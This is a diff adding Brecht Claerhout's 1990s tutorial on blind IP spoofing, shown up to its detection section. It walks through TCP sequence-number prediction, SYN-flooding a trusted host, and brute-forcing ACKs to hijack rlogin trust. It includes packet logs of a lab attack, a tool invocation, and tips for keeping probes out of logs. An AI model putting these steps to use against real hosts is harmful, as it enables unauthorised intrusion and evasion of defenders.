@@ -1,0 +1,2533 @@
+             -=[ A short overview of IP spoofing: PART II ]=-
+                    -=[ Part of 'The Packet Project']=-
+                                                  
+            (Includes Source for Linux 1.3.X and later kernels)
+    All text and Source code written by Brecht Claerhout (Copyright 1996-7)
+                 All source tested on Linux kernel 2.0.X
+               All packet data captured with Sniffit 0.3.5
+-------------------------------------------------------------------------------
+
+PART II: Advanced spoofing (Blind) 
+----------------------------------
+
+0. Introduction 	
+0.1 What
+0.2 For whom
+0.3 Disclaimer
+0.4 License
+
+1. Description of source code
+
+2. General information
+2.1 Source Routed IP
+2.2 Rerouting
+
+3. Blind spoofing
+3.1 Sequence number generation
+3.1.1 Situation of the problem
+3.1.2 Sequence number generation
+3.1.2.a The old 64K rule
+3.1.2.b Time related generation
+3.1.2.c The 'pain in the ass' generation
+3.2 Sequence number prediction
+3.2.a 64K rule
+3.2.b Time relation
+3.3 The attack
+3.3.1 Connection initiation
+3.3.1.a 64K rule
+3.3.1.b Time relation
+3.3.2 Sending the data
+3.3.3 The attack
+3.3.4 Full log
+3.3.5 Detection, and avoiding it
+3.3.5.a Probes
+3.3.5.b RST packets
+3.3.5.c The ACK guesses
+3.3.5.d Retransmission
+
+4. How to use the source code
+4.1 SEQ-scan
+4.2 Eriu
+4.3 Improvements
+
+Appendix: Short note about rlogin
+Appendix: Source Code
+
+-------------------------------------------------------------------------------
+                    PART II: Advanced spoofing (Blind) 
+------------------------------------------------------------------------------
+
+0. Introduction
+---------------
+
+This is the sequel to 'A short overview of IP spoofing: PART I' that 
+discussed Non Blind Spoofing. I actually wasn't planning on doing 'PART II' 
+anymore. But the many mails I received asking for 'PART II' made me put it 
+together anyway. 
+I'm afraid it will disappoint you, but read it anyway, maybe you'll like
+some of the source code...
+
+0.1 What
+--------
+
+This document describes some IP spoofing attacks and it gives you example 
+source code of the programs used on these attacks (and packet sniffer logs, so
+you see what exactly happens).
+
+If you have interesting remarks, comment, idea's, ... please contact me
+	Brecht Claerhout <Coder@reptile.rug.ac.be>
+
+If YOU think of yourself, you are "3><Tr3/\/\3lY 3Le3T", please don't bother 
+contacting me. 
+Flames >/dev/null or >/dev/echo depends on how idiotic you are.
+
+It is not wise to use what you don't know/understand, so read this before 
+trying anything... it will only take a few minutes, and probably save you 
+some hours of failure...
+
+This code is not crippled in the usual way (removing some vital part), 
+the power is limited by it's briefness, because I wanted to keep 
+everything simple and illustrative (but working). It's a simple job to 
+improve it, and that is the goal of this doc, that you improve it yourself.
+
+Finally, I want to thank Fyodor <fyodor@dhp.com> for correcting most of my 
+grammar and spelling errors, any errors left are fully my responsibility, not 
+his.
+
+0.2 For whom
+------------
+
+For people with a small knowledge of TCP/IP, some knowledge on C (only 
+the basic setup) and a little general UNIX knowledge.
+It's no use reading this document if you are completely unaware of these 
+things, but mind you, only a little knowledge is enough.
+
+0.3 Disclaimer
+--------------
+
+I am in no way responsible for the use of this program. By using this 
+software and reading this document you accept the fact that any damage 
+(emotional, physical, data loss, ...) caused by the use or storage of 
+these programs/documents is not MY responsibility.
+
+I state that during the writing and testing of this document/source, I 
+never violated any law. All spoofing was done between machines where I had 
+legit root access, or where I had the permission from the legit root.
+
+0.4 License
+-----------
+
+All source code and text is freely available. You can spread it, as long 
+as you don't charge for it (exceptions are a small reproduction fee, if 
+it isn't spread together with commercial software, texts.)
+You may not spread parts of the document, it should be spread as one 
+package. You may not modify the text and/or source code. 
+
+You can use the spoofit.h in your own programs as long as they are not 
+commercial (i.e. FREE), and you give me the credits for it in your 
+documentation (either separate docs, or included in source). In that case 
+you can modify the spoofit_v3.h file, if it is mentioned.
+
+
+1. Description of source code
+----------------------------
+
+spoofit_v3.h - a new version of the spoofit library.
+
+SEQ-scan.c   - program to analyze the SEQ nr generator of a host.
+
+eriu.c       - an automated blind spoofing utility.
+
+
+2. General information
+----------------------
+
+What is IP spoofing? IP spoofing is pretending to be someone else on IP
+level. The reason for this is that we want to abuse a relation of trust that
+is based on identification by IP address (this is not the sole purpose, but
+the most occurring). 
+
+So we will have to find a trusted relation between the host we want to 
+attack and another host. The most popular trust-relation is the '.rhosts' 
+file, as you know many other exist. I won't discuss this topic here. 
+
+Mind you this is not the only use for spoofing, suppose you have some
+information on a system (password file and cracked it) obtained by certain
+security holes (like CGI scripts), but no other connections are allowed
+except from some specified hosts ('hosts.allow', 'hosts.deny'). Well you can
+spoof a connection, make some 'adjustments' and open the system to you...
+
+Throughout this document I will use the following names for the hosts:
+  X is the target host (the one we want to hack).
+  T is the host that is trusted by X.
+  A is our host (the Attacker).
+
+A has no relation whatsoever with X or T, this was not the case when we
+discussed non-blind spoofing.
+Now the problem with blind spoofing is that we do not see the contence of 
+the packets that are generated by X, let me explain:
+All the packets we (host A) send are apparently coming from host T (we 
+spoof them as from T to X). So when X receives such a packet, it thinks T is 
+contacting him (which is our goal). 
+Now, host X will send all its answers (packets) to T, they will never be 
+seen by host A. Thus, we will NOT be able to see what happens (and we need to 
+see it, see below Sequence numbers 3.1). 
+There are methods to avoid this problem, the methods are briefly 
+mentioned below.
+
+2.1 Source Routed IP
+--------------------
+
+The IP protocol has a feature (an option) that is called Source Routing 
+(either 'strict' or 'loose') that makes it possible for the sender to specify 
+a route to follow. 
+The reverse route is recorded back in the IP header (in the place of the 
+forward route) and the receiver has to send any answers along the same route.
+
+So if we use Source Routed IP packets we could spoof a packet from 
+host A and include a route that leads to us instead of to the real host T.
+Luckily (depending on what side you look at it) this isn't possible 
+in general. Most routers, gateways and hosts, drop Source Routed IP packets 
+(standard manufacturer configuration). To give an example: when compiling a 
+Linux kernel (in the 'make config' stage) you are explicitly asked if you 
+want to accept or drop Source Routed IP packets.
+
+So we can generally say this method has a very low chance of success.
+
+2.2 Rerouting 
+-------------
+
+A similar method to retrieve the 'invisible' packets, is to mess with the 
+route by sending spoofed routing packets to the target host and gateways 
+on the path. For more information, read up on Routing protocols such as 
+RIP, EGP, ... (See "Internet Official Protocol Standards" for goodies).
+This is not discussed in this document, maybe I'll write something up 
+later, maybe not...
+
+NOTE: ICMP redirect springs to mind here, but remember it only applies to 
+      existing connections and may only be sent from the first gateway on 
+      the path, which turns them pretty useless for our purpose.
+
+
+3. Blind spoofing 
+-----------------
+
+This brings us to the real subject of my writing. Blind spoofing attacks.
+
+3.1 Sequence number generation
+------------------------------
+
+3.1.1 Situation of the problem
+------------------------------
+
+As you know, TCP uses a SEQ/ACK system (Sequence nr./Acknowledge) to do 
+what it is supposed to do.
+
+A connection is initiated like this in it's simplest form (the well known 
+three-way-handshake):
+
+Packet 1: Client -> Server
+          flags: SYN            ("I want to initiate a connection")
+          SEQ  : clientnr
+Packet 2: Server -> Client
+          flags: SYN, ACK       (ACK: The request is being acknowledged)
+          SEQ  : servernr
+          ACK  : clientnr+1
+Packet 3: Client -> Server
+          flags: ACK        
+          SEQ  : clientnr+1
+          ACK  : servernr+1 
+
+When you think back to what I said, in our spoofed case we will have: 
+
+Packet 1: T -> X (actually A -> X but we spoof it)
+          flags: SYN           
+          SEQ  : clientnr
+Packet 2: X -> T
+          flags: SYN, ACK
+          SEQ  : servernr
+          ACK  : clientnr+1
+
+But what now? Because we (host A) can't see Packet 2, we cannot use 
+'servernr' to calculate the required ACK (servernr+1) for Packet 
+three. We will have to predict it one way or another, so that Packet 
+3 can be:
+
+Packet 3: T -> X (actually A -> X but we spoof it)
+          flags: ACK        
+          SEQ  : clientnr+1
+          ACK  : guessed_servernr+1
+
+If guessed_servernumber is incorrect, we have failed to initiate a 
+connection, a second problem is, that we don't know if we have failed or 
+not.
+
+Technical Note:
+I made it a bit too simple, when host X sends it's answer:
+
+Packet 2: X -> T
+          flags: SYN, ACK
+          SEQ  : servernumber
+          ACK  : clientnr+1
+
+Host T will receive the packet! Host T doesn't know of any connection 
+initiated to X, so it tells X to stop the connection initiation, as it is 
+bogus. It does that by sending a RST (reset) to host X. 
+If the RST reaches host X, the connection we are trying to set up, will 
+not get established.
+You understand, that we have to prevent T from doing such things.
+You could wait until T is off line, or you could try some denial of 
+service attack to take host T down. The 'standard' (classical) procedure is to 
+perform a SYN flood from A to T.
+You SYN flood the port on T that you are faking, when it is flooded, it 
+will not be able to handle further incoming packets.
+So it will not be able to see 'Packet 2' and send it's deadly RST.
+You all know more and more systems get SYN flood protection, so be a bit 
+creative here, any technique that disables a port on host T is good. 
+
+3.1.2 Sequence number generation
+--------------------------------
+
+Now how to predict these annoying SEQ's?
+To find an answer to that problem, we will have to look at how the Server 
+(host X in our case), chooses 'servernr'.
+The purpose of the original TCP design was to avoid data transmission problems,
+not to keep hackers out. Thus the older systems, or OS's based on them are (as
+always) the most vulnerable.
+
+There are roughly speaking 3 ways of sequence number generation.
+(Note that I don't discuss how the SEQ-generators are started)
+(mind you SEQ number space is 4 bytes (0 to 2^32-1))
+
+3.1.2.a The old 64K rule
+
+This system is surprisingly still often used, and a lot of programs that have 
+something to with spoofing, rely on this rule.
+It goes like this:
+  - increase the SEQ-counter every second with a constant (mostly 128000)
+  - if there is a connection initiated, increase the SEQ-counter 
+    with another constant (mostly 64000)
+
+As you see, these numbers are very easy to predict. 1 second is a very 
+large period in the computer world. 
+This '64K rule' is still used in OSF, older SunOS versions, ... 
+
+3.1.2.b Time related generation
+
+A very popular and simple method. It allows the SEQ-generator to generate 
+pseudo random numbers (maybe 'random' is not the correct word here). After 
+initialization at boot time, the SEQ-generator is increased every 
+'x time_units'.
+Note that 'time_units' on computers are not always perfect, and not all 
+'time_units' are equal in length, depending on how they are measured, on 
+the load of the computer, etc... (discussing this would take us to far, 
+is doesn't matter anyway).
+
+An example is the 1 usec clock on older LINUX kernels, after initialization, 
+the SEQ-generator was increased by one every microsec (if you still have 
+such a kernel lying around, have a look at the code).
+
+3.1.2.c The 'pain in the ass' generation
+
+An example of this is to be found in the 'new' LINUX kernel (have a look 
+at the code if you dare ;)). Random generators are used to generate SEQ 
+numbers, what makes the SEQ numbers nearly impossible to guess.
+
+3.2 Sequence number prediction
+------------------------------
+
+Now how to detect these generators described above? Well for that we will 
+use the program 'SEQ-scan.c' I've put together. Let me explain what 
+it exactly does (see source code also).
+
+What we do to test the sequence generator, is send some SYN packets from 
+host A (not spoofed, as we want to see the replies back). Then we look at 
+what host X sends us as SEQ, we record and study them. 
+
+3.2.a 64K rule
+
+This is quite easy, I just calculate the differences between 2 SEQ's that 
+are generated by host X and see if it can be divided by 64000. 'SEQ-scan.c' 
+sends more then 2 packets to eliminate wrong conclusions in case of 
+error-transmission, or just pure luck (see function 'get_seq_nrs' and 
+'easy_64k_rule').
+
+3.2.b Time relation
+
+Time relation detection scheme's are mostly based on the RTT (Round Trip 
+Time). The RTT is the time between the sending of a packet and the 
+receiving of the answer on that packet.
+You can find the time recording in the function 'get_seq_nrs':
+
+  transmit_TCP(fd_send, NULL, 0,0,0, SOURCE, port, TARGET, TARGET_P,
+                                                      STARTSEQ+i,0, SYN);  
+  stat=wait_packet(fd_receive,&pinfo,TARGET,TARGET_P,SOURCE,port,SYN,20);
+  gettimeofday(&(time_list[i]),NULL);
+
+You see I only record the time AFTER receiving the answer. When 
+calculating the time differences, they will correspond with the time 
+intervals on which host X has generated its SEQ.
+From those time differences and the recorded SEQ differences I calculate the 
+'average generator increment/per usec'. I then study how much the real 
+generator increments differ from my calculated average. If there isn't much 
+difference, we have found ourself a time relation. If there are big 
+differences, sequence number generation is not done by a simple time 
+relation.
+(I calculate the quadratic error to give me a number for decision making, 
+I also remove the minimum and maximum value to avoid to much interference 
+from bad luck, for more details take a look at the function 
+'simple_time_relation'. Experience showed me, this is good enough.)
+
+As for random number generation: SEQ scan will fail to find a relation, 
+resulting in very high quadratic error numbers. 
+
+3.3 The attack 
+--------------
+
+3.3.1 Connection initiation
+---------------------------
+
+3.3.1.a 64K rule
+
+Quite easy, as you can expect. 
+  1. cripple host T (e.g. SYN flood)
+  2. send a SYN from A -> X (real packet)
+  3. get the SEQ-nr from the SYN|ACK answer send to A by X
+  4. From that SEQ-nr, calculate the following number generated by X 
+     (GUESS = SEQ + 64000)
+  5. Send a SYN from A -> X (spoofed from T)
+  6. wait, and send a SYN|ACK from A -> X (spoofed from T)
+     using the newly calculated GUESS + 1 as ACK.
+  
+(Now, you will not be always successful, but this is a 90% or more sure 
+attack, besides we will use the same technique as described in 3.3.1.b, 
+for firing multiple packets.)
+
+The question that now comes to mind is:
+We have a connection, so we 'know' the SEQ'nr. that X expects from us, but if 
+X sends data, we don't know exactly how much and when, so we have lost 
+track of the ACK's that X expects. 
+This will make us unable to send correct ACK's, so are we in trouble now??
+
+As you probably guessed, the answer is: "NO, we are cool". 
+What will happen if we don't ACK the data send by X, is that X will think
+the packets got lost somewhere. After a certain timeout (not receiving ACK)
+it will do a retransmission. The server will send no more data (except the
+bytes in his window, see TCP manual) to the client (that is not responding).
+This will NOT affect data coming from the client.
+So X keeps on processing our data, but is unable to send the results back, 
+as we don't care about the answers (we can't see them anyway), this is no 
+problem for us.
+
+3.3.1.b Time relation
+
+Basically, we will do the same thing as described above, unfortunately our 
+success chances are lowered considerably.
+
+  1. cripple host T (e.g. SYN flood)
+  2. Predict the next SEQ of X in some way
+  3. Send a SYN from A -> X (spoofed from T)
+  4. wait, and send a SYN|ACK from A -> X (spoofed from T)
+     using the newly calculated GUESS + 1 as ACK.
+
+Point 2. isn't dead-easy here. We know there is a time relation, so what 
+we could do is measure and extrapolate (= guess) the RTT (round trip 
+time), and with the last collected SEQ nr. from the RTT measuring, we can 
+calculate a new one.
+What I will do here, is do a few probes for SEQ'nr's and calculate the 
+new SEQ nr from the average increment (calculated from the probes). This 
+generally is the same thing as RTT calculations (think about it), but is a 
+lot easier to do.
+
+Now we see that point 2. pumps the uncertainty up tremendously, now what 
+can we do to push it down a little again?
+We will send multiple guesses to the server (multiple packets with different
+ACK guesses at point 4.).
+It is interesting to have a look at how the server behaves when you do such
+a guess: 
+
+1) X is 192.168.66.6, T is 1.1.1.1, and the IP of A doesn't matter
+   First of all a SYN is send. (after the SEQ prediction of course)
+ 
+TCP Packet ID (from_IP.port-to_IP.port): 1.1.1.1.9666-192.168.66.6.23
+   SEQ (hex): FF00FFEE      FLAGS: ----S-
+
+2) X answers with a SYN/ACK  
+
+TCP Packet ID (from_IP.port-to_IP.port): 192.168.66.6.23-1.1.1.1.9666
+   SEQ (hex): AEBC60BB   ACK (hex): FF00FFEF
+   FLAGS: -A--S-   Window: 3C00
+
+3) Now suppose we send some spoofed packets
+   Our attack starts at AEBC60C6 (which is bigger then the correct AEBC60BC)
+
+TCP Packet ID (from_IP.port-to_IP.port): 1.1.1.1.9666-192.168.66.6.23
+   SEQ (hex): FF00FFEF   ACK (hex): AEBC60C6
+   FLAGS: -A----   Window: 7C00
+
+4) Look what happens, X sends a RST packet. Don't worry, it does NOT interfere 
+   with our attack, but it raises network traffic.
+
+TCP Packet ID (from_IP.port-to_IP.port): 192.168.66.6.23-1.1.1.1.9666
+   SEQ (hex): AEBC60C6      FLAGS: ---R--
+
+Let's do that again:
+
+1) Same setup, SYN and the response SYN/ACK 
+
+TCP Packet ID (from_IP.port-to_IP.port): 1.1.1.1.10666-192.168.66.6.23
+   SEQ (hex): FF00FFEE      FLAGS: ----S-
+
+TCP Packet ID (from_IP.port-to_IP.port): 192.168.66.6.23-1.1.1.1.10666
+   SEQ (hex): E1DC0057   ACK (hex): FF00FFEF
+   FLAGS: -A--S-   Window: 3C00
+
+2) Now we send a packet with an incorrect guess (ACK to small)
+   (ACK is E1DC004E, should be E1DC0058)
+
+TCP Packet ID (from_IP.port-to_IP.port): 1.1.1.1.10666-192.168.66.6.23
+   SEQ (hex): FF00FFEF   ACK (hex): E1DC004E
+   FLAGS: -A----   Window: 7C00
+
+3) Look what happens, nothing (no RST here). There is a retransmission of the 
+   SYN/ACK after some time, as no completion of the handshake is done.
+
+TCP Packet ID (from_IP.port-to_IP.port): 192.168.66.6.23-1.1.1.1.10666
+   SEQ (hex): E1DC0057   ACK (hex): FF00FFEF
+   FLAGS: -A--S-   Window: 3C00
+
+4) We can go on a while with this, until suddenly we 'hit' the correct ACK.
+
+TCP Packet ID (from_IP.port-to_IP.port): 1.1.1.1.10666-192.168.66.6.23
+   SEQ (hex): FF00FFEF   ACK (hex): E1DC0058
+   FLAGS: -A----   Window: 7C00
+
+5) Now the connection is established, look at the netstat output on host X:
+
+Proto Recv-Q Send-Q Local Address           Foreign Address         State
+tcp        0      0 sniffit:telnet          1.1.1.1:10666           ESTABLISHED
+
+6) Following guesses with wrong ACK's will not interfere your connection
+   (nor generate RST's).
+   Now you can continue with the attack and insert your data (discussed 
+   further)
+
+So summed up, if our ACK's are to big, we cause the generation of a 
+RST packet, what will make our attack easier to detect. It is advised you 
+start with the smallest guess, and increment them, not the other way around.
+
+Unfortunately, this is NOT TRUE for all OS's, the SunOS's I played with for
+example ALWAYS generated RST's. So if you are attacking such a system, you
+can't avoid the RST generation.
+
+How to decide which span ACK's to brute force (because that is kinda what you 
+are doing). Well, there is no real general rule. Best thing you can do is run 
+the SEQ-nr predictor you are going to use on a host for a sec, and compare the 
+guesses with the real numbers.
+How to use the source code included with this text is discussed later.
+
+NOTE: at the risk of being repetitive, but to be sure you get it right:
+      The RST packets DO NOT reset your attempt to set up a connection.
+      They DO NOT defend host X against your attack.
+
+3.3.2 Sending the data
+----------------------
+
+Now that we have initiated a connection, we should be sending some data 
+'along the lines'.
+After the connection is initiated the ACK's really don't matter anymore.
+Like I explained before, we don't care about any answers the server wants to
+send, as long as our data is accepted.
+
+What to send on a connection?? Well that is up to you, it depends on the
+service you want to attack. In 'eriu.c' I use a command file that offers you 
+the possibility of attacking any service with the same program.
+
+3.3.3 The attack 
+----------------
+
+What I described above sounds fairly simple. But you have to realize, the 
+SEQ guessing won't be the only problem you will have to face in most cases.
+There are many ways a site can be protected against spoofing attacks, the
+most obvious is to remove all trusted relations. Also OS's like Linux have a
+good SEQ'nr generator, which greatly improves the defense against spoofing.
+
+Firewalls and all kinds of packet filters (you need something to base your
+guess upon right?!) or additional identification scheme's can all make an 
+attack unlikely to succeed.
+  
+Take IDENT for example, this extremely simple protocol can already cause an
+important increase of problems for an attacker.
+Not only do you have the problem of guessing the SEQ'nr. of your 'attack' 
+connection, but also you have the uncertainty of the SEQ nr generated by the 
+IDENT connection and the source port of that connection.
+
+On a '64K ruler' this is still relatively easy if you can attack on 
+'silent' periods (= when there is nearly no traffic to the system), you 
+can predict the port IDENT will use (ports are used sequentially), and 
+the SEQ nr. can easily be guessed, as the generator is easily predicted.
+
+3.3.4 Full log
+--------------
+
+This is the full log of a simulated attack with 'Eriu'. It was done with the
+command line (See below for use of 'Eriu', and for more information on the
+command file, here 'rlogin.demo'):
+'./eriu -s 192.168.66.66:1023 -t 192.168.66.1:513 -f rlogin.demo -c 5 -F'
+
+The attacked host is 192.168.66.1, we pretend to be 192.168.66.66 (the
+attack was done from 192.168.66.6). It is a faked attack as we force the
+ACK, this was done to be able to limit the packet count to 5. I also show you 
+the responses the attacked host send to make everything clearer, again you 
+normally don't see them.
+
+1) First packet to initiate a connection.
+ 
+TCP Packet ID (from_IP.port-to_IP.port): 192.168.66.66.1023-192.168.66.1.513
+   SEQ (hex): 223EE666      FLAGS: ----S-
+
+2) This packet we normally don't see...
+ 
+TCP Packet ID (from_IP.port-to_IP.port): 192.168.66.1.513-192.168.66.66.1023
+   SEQ (hex): 19B24FC3   ACK (hex): 223EE667
+   FLAGS: -A--S-   Window: 3C00
+
+3) Here we do a ACK guess of 5 different ACK's. 5 is a very small number, in
+   reality you should use larger quantities (10000 is not exceptional) of 
+   attack packets, this here is just a demonstration. (To much packets would 
+   unnecessarily prolong this text).
+   ACK space from 19B24FC1 to 19B24FC5 is scanned, with 19B24FC4 the correct
+   ACK
+
+TCP Packet ID (from_IP.port-to_IP.port): 192.168.66.66.1023-192.168.66.1.513
+   SEQ (hex): 223EE667   ACK (hex): 19B24FC1
+   FLAGS: -A----   Window: 7C00
+
+TCP Packet ID (from_IP.port-to_IP.port): 192.168.66.66.1023-192.168.66.1.513
+   SEQ (hex): 223EE667   ACK (hex): 19B24FC2
+   FLAGS: -A----   Window: 7C00
+
+TCP Packet ID (from_IP.port-to_IP.port): 192.168.66.66.1023-192.168.66.1.513
+   SEQ (hex): 223EE667   ACK (hex): 19B24FC3
+   FLAGS: -A----   Window: 7C00
+
+4) This packet initiates the connection, although we do not know that.
+ 
+TCP Packet ID (from_IP.port-to_IP.port): 192.168.66.66.1023-192.168.66.1.513
+   SEQ (hex): 223EE667   ACK (hex): 19B24FC4
+   FLAGS: -A----   Window: 7C00
+
+5) Attack continued
+
+TCP Packet ID (from_IP.port-to_IP.port): 192.168.66.66.1023-192.168.66.1.513
+   SEQ (hex): 223EE667   ACK (hex): 19B24FC5
+   FLAGS: -A----   Window: 7C00
+
+6) Now that the connection is hopefully established we can start sending our
+   data. Here I spoof a rlogin connection, so I have to imitate the protocol
+   used with rlogin (See small Appendix about rlogin).
+
+7) This packet contains the first 4 null terminated strings to initiate a
+   rlogin session. Like I already mentioned with the 64k rule attack, the ACK
+   from now on, doesn't really matter if you don't care for what is returned by
+   the server. And as we can't see it anyway, be naturally don't care if how
+   much and what exactly the server sends back.
+
+TCP Packet ID (from_IP.port-to_IP.port): 192.168.66.66.1023-192.168.66.1.513
+   SEQ (hex): 223EE667   ACK (hex): 19B24FC1
+   FLAGS: -AP---   Window: 7C00
+Packet ID (from_IP.port-to_IP.port): 192.168.66.66.1023-192.168.66.1.513
+ 45 E 00 . 00 . 40 @ 31 1 01 . 00 . 00 . 45 E 06 . 3F ? 23 # C0 . A8 . 42 B 42 B
+ C0 . A8 . 42 B 01 . 03 . FF . 02 . 01 . 22 " 3E > E6 . 67 g 19 . B2 . 4F O C1 .
+ 50 P 18 . 7C | 00 . C6 . 42 B 00 . 00 . 00 . 63 c 6F o 64 d 65 e 72 r 00 . 73 s
+ 70 p 6F o 6F o 66 f 00 . 76 v 74 t 31 1 30 0 30 0 2F / 39 9 36 6 30 0 30 0 00 .
+
+8) Notice that the server acknowledges our data.
+
+TCP Packet ID (from_IP.port-to_IP.port): 192.168.66.1.513-192.168.66.66.1023
+   SEQ (hex): 19B24FC4   ACK (hex): 223EE67F
+   FLAGS: -A----   Window: 3C00
+ 
+9) One null byte to inform us that the 4 null terminated strings were
+   received (see rlogin appendix).
+   (again, this is normally invisible for us)
+
+TCP Packet ID (from_IP.port-to_IP.port): 192.168.66.1.513-192.168.66.66.1023
+   SEQ (hex): 19B24FC4   ACK (hex): 223EE67F
+   FLAGS: -AP---   Window: 3C00
+Packet ID (from_IP.port-to_IP.port): 192.168.66.1.513-192.168.66.66.1023
+ 45 E 10 . 00 . 29 ) 29 ) B7 . 40 @ 00 . 3F ? 06 . 0C . 74 t C0 . A8 . 42 B 01 .
+ C0 . A8 . 42 B 42 B 02 . 01 . 03 . FF . 19 . B2 . 4F O C4 . 22 " 3E > E6 . 7F .
+ 50 P 18 . 3C < 00 . F6 . 02 . 00 . 00 . 00 .
+
+10) Window negotiation (see rlogin appendix).
+ 
+TCP Packet ID (from_IP.port-to_IP.port): 192.168.66.66.1023-192.168.66.1.513
+   SEQ (hex): 223EE67F   ACK (hex): 19B24FC1
+   FLAGS: -AP---   Window: 7C00
+Packet ID (from_IP.port-to_IP.port): 192.168.66.66.1023-192.168.66.1.513
+ 45 E 00 . 00 . 34 4 31 1 01 . 00 . 00 . 45 E 06 . 3F ? 2F / C0 . A8 . 42 B 42 B
+ C0 . A8 . 42 B 01 . 03 . FF . 02 . 01 . 22 " 3E > E6 . 7F . 19 . B2 . 4F O C1 .
+ 50 P 18 . 7C | 00 . 42 B 1E . 00 . 00 . FF . FF . 73 s 73 s 00 . 19 . 00 . 50 P
+ 00 . 00 . 00 . 00 .
+
+TCP Packet ID (from_IP.port-to_IP.port): 192.168.66.1.513-192.168.66.66.1023
+   SEQ (hex): 19B24FC5   ACK (hex): 223EE68B
+   FLAGS: -A----   Window: 3C00
+Packet ID (from_IP.port-to_IP.port): 192.168.66.1.513-192.168.66.66.1023
+ 45 E 10 . 00 . 28 ( 29 ) B8 . 40 @ 00 . 3F ? 06 . 0C . 74 t C0 . A8 . 42 B 01 .
+ C0 . A8 . 42 B 42 B 02 . 01 . 03 . FF . 19 . B2 . 4F O C5 . 22 " 3E > E6 . 8B .
+ 50 P 10 . 3C < 00 . F5 . FE . 00 . 00 .
+
+11) The password of user 'spoof' is 'spoof' (I didn't set up a trusted relation
+    doesn't matter anyway, just don't send a password ;))
+
+TCP Packet ID (from_IP.port-to_IP.port): 192.168.66.66.1023-192.168.66.1.513
+   SEQ (hex): 223EE68B   ACK (hex): 19B24FC1
+   FLAGS: -AP---   Window: 7C00
+Packet ID (from_IP.port-to_IP.port): 192.168.66.66.1023-192.168.66.1.513
+ 45 E 00 . 00 . 2E . 31 1 01 . 00 . 00 . 45 E 06 . 3F ? 35 5 C0 . A8 . 42 B 42 B
+ C0 . A8 . 42 B 01 . 03 . FF . 02 . 01 . 22 " 3E > E6 . 8B . 19 . B2 . 4F O C1 .
+ 50 P 18 . 7C | 00 . 6D m 0A . 00 . 00 . 73 s 70 p 6F o 6F o 66 f 0A .
+
+12) Retransmission as we do not ACK anything.
+    But notice that our send data is ACK'ed, thus accepted.
+
+TCP Packet ID (from_IP.port-to_IP.port): 192.168.66.1.513-192.168.66.66.1023
+   SEQ (hex): 19B24FC5   ACK (hex): 223EE691
+   FLAGS: -A----   Window: 3C00
+Packet ID (from_IP.port-to_IP.port): 192.168.66.1.513-192.168.66.66.1023
+ 45 E 10 . 00 . 28 ( 29 ) B9 . 40 @ 00 . 3F ? 06 . 0C . 73 s C0 . A8 . 42 B 01 .
+ C0 . A8 . 42 B 42 B 02 . 01 . 03 . FF . 19 . B2 . 4F O C5 . 22 " 3E > E6 . 91 .
+ 50 P 10 . 3C < 00 . F5 . F8 . 00 . 00 .
+
+13) Evil commands...
+    Here it is 'touch This_site_was_hacked', quiet evil, isn't it? 
+
+TCP Packet ID (from_IP.port-to_IP.port): 192.168.66.66.1023-192.168.66.1.513
+   SEQ (hex): 223EE691   ACK (hex): 19B24FC1
+   FLAGS: -AP---   Window: 7C00
+Packet ID (from_IP.port-to_IP.port): 192.168.66.66.1023-192.168.66.1.513
+ 45 E 00 . 00 . 43 C 31 1 01 . 00 . 00 . 45 E 06 . 3F ? 20   C0 . A8 . 42 B 42 B
+ C0 . A8 . 42 B 01 . 03 . FF . 02 . 01 . 22 " 3E > E6 . 91 . 19 . B2 . 4F O C1 .
+ 50 P 18 . 7C | 00 . 51 Q D1 . 00 . 00 . 74 t 6F o 75 u 63 c 68 h 20   54 T 68 h
+ 69 i 73 s 5F _ 73 s 69 i 74 t 65 e 5F _ 77 w 61 a 73 s 5F _ 68 h 61 a 63 c 6B k
+ 65 e 64 d 0A .
+
+TCP Packet ID (from_IP.port-to_IP.port): 192.168.66.1.513-192.168.66.66.1023
+   SEQ (hex): 19B24FC5   ACK (hex): 223EE6AC
+   FLAGS: -A----   Window: 3C00
+Packet ID (from_IP.port-to_IP.port): 192.168.66.1.513-192.168.66.66.1023
+ 45 E 10 . 00 . 28 ( 29 ) BA . 40 @ 00 . 3F ? 06 . 0C . 72 r C0 . A8 . 42 B 01 .
+ C0 . A8 . 42 B 42 B 02 . 01 . 03 . FF . 19 . B2 . 4F O C5 . 22 " 3E > E6 . AC .
+ 50 P 10 . 3C < 00 . F5 . DD . 00 . 00 .
+
+TCP Packet ID (from_IP.port-to_IP.port): 192.168.66.1.513-192.168.66.66.1023
+   SEQ (hex): 19B24FC4   ACK (hex): 223EE6AC
+   FLAGS: -AP---   Window: 3C00
+Packet ID (from_IP.port-to_IP.port): 192.168.66.1.513-192.168.66.66.1023
+ 45 E 10 . 00 . 29 ) 29 ) BB . 40 @ 00 . 3F ? 06 . 0C . 70 p C0 . A8 . 42 B 01 .
+ C0 . A8 . 42 B 42 B 02 . 01 . 03 . FF . 19 . B2 . 4F O C4 . 22 " 3E > E6 . AC .
+ 50 P 18 . 3C < 00 . F5 . D5 . 00 . 00 . 00 .
+
+14) and finally we close the connection.
+
+TCP Packet ID (from_IP.port-to_IP.port): 192.168.66.66.1023-192.168.66.1.513
+   SEQ (hex): 223EE6AC      FLAGS: ---R--
+Packet ID (from_IP.port-to_IP.port): 192.168.66.66.1023-192.168.66.1.513
+ 45 E 00 . 00 . 28 ( 31 1 01 . 00 . 00 . 45 E 06 . 3F ? 3B ; C0 . A8 . 42 B 42 B
+ C0 . A8 . 42 B 01 . 03 . FF . 02 . 01 . 22 " 3E > E6 . AC . 19 . B2 . 4F O C1 .
+ 50 P 04 . 7C | 00 . B5 . ED . 00 . 00 .
+
+3.3.5 Detection, and avoiding it
+--------------------------------
+
+If you payed a little bit of attention during the reading of this text, you
+already have a good idea of how an attack can be detected.
+
+3.3.5.a Probes
+
+No spoofing attack without the probes to predict SEQ numbers. These can
+easily be hidden of course.
+Suppose the server runs a 'httpd', well, you can do the SEQ number analyzing
+by accessing the web pages on that server, don't immediately reset after
+receiving the necessary data, but continue the connection with a legit http
+request (after the first SYN of the attack is send because otherwise you'll
+lose to much time, and you're guess will be too incorrect). The same off course
+can be done with FTP, or any other public service provided by the target host.
+Problem is however that the attack will follow immediately after the probe,
+so this too can be a lead for the detector/tracer.
+You should only do such a thing if you think the site has taken special logging
+precautions, because otherwise the probes won't show up in the logs.
+
+3.3.5.b RST packets
+
+I already mentioned that guessing causes RST packets. Well you know how
+to avoid them (with some OS's), make sure you start your guess with to small 
+ACK's. (This is off course only true if you increment all ACK's with 1, if 
+you use a scheme increments the ACK with a step of 2 to increase scan space, 
+you have 50% risk of missing the correct ACK and thus generation RST's when 
+missing the ACK)
